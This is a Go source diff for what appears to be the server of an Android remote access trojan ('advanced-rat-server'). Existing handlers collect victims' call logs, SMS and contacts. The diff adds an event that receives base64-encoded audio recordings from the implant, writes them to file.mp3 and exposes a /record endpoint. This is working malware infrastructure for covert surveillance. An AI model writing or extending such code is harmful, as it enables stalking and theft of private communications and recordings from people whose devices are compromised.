@@ -1,7 +1,11 @@
 package main
 
 import (
+	"encoding/base64"
+	"encoding/json"
 	"fmt"
+	"os"
+
 	//"github.com/go-chi/chi"
 	//"github.com/go-chi/chi/middleware"
 	"github.com/diptomondal007/advanced-rat-server/handlers"
@@ -24,7 +28,13 @@ import (
 
 
 var server socketio.Server
+type record struct {
+	file bool `json:"file"`
+	name string `json:"name"`
+	buffer map[string]interface{} `json:"buffer"`
+}
 
+var re interface{}
 func main() {
 	//Chi instance
 	//r  := chi.NewRouter()
@@ -32,7 +42,6 @@ func main() {
 	////Chi middleware
 	//r.Use(middleware.Logger)
 	//r.Use(middleware.Recoverer)
-
 	server, err := socketio.NewServer(nil)
 	if err != nil {
 		log.Fatal(err)
@@ -58,6 +67,27 @@ func main() {
 		log.Println(data)
 		handlers.CallLogs = data
 	})
+	server.OnEvent("/","record", func(c  socketio.Conn,data string) {
+		dec, err := base64.StdEncoding.DecodeString(data)
+		if err != nil {
+			panic(err)
+		}
+
+		f, err := os.Create("file.mp3")
+		if err != nil {
+			panic(err)
+		}
+		defer f.Close()
+
+		if _, err := f.Write(dec); err != nil {
+			panic(err)
+		}
+		if err := f.Sync(); err != nil {
+			panic(err)
+		}
+		log.Println("record received")
+	})
+
 	server.OnError("/", func(s socketio.Conn, e error) {
 		fmt.Println("meet error:", e)
 	})
@@ -75,6 +105,14 @@ func main() {
 	http.HandleFunc("/sms/list", handlers.SmsListView)
 	http.HandleFunc("/contact/list", handlers.ContactListView)
 	http.HandleFunc("/call/logs", handlers.CallLogsView)
+	http.HandleFunc("/record", recordView)
 	log.Println("Listening on 8000....")
 	log.Fatal(http.ListenAndServe(":8000", nil))
+}
+
+func recordView(w http.ResponseWriter, r *http.Request){
+	w.Header().Set("Content-Type","application/json")
+	log.Println(re)
+	res , _ :=json.Marshal(re)
+	w.Write(res)
 }
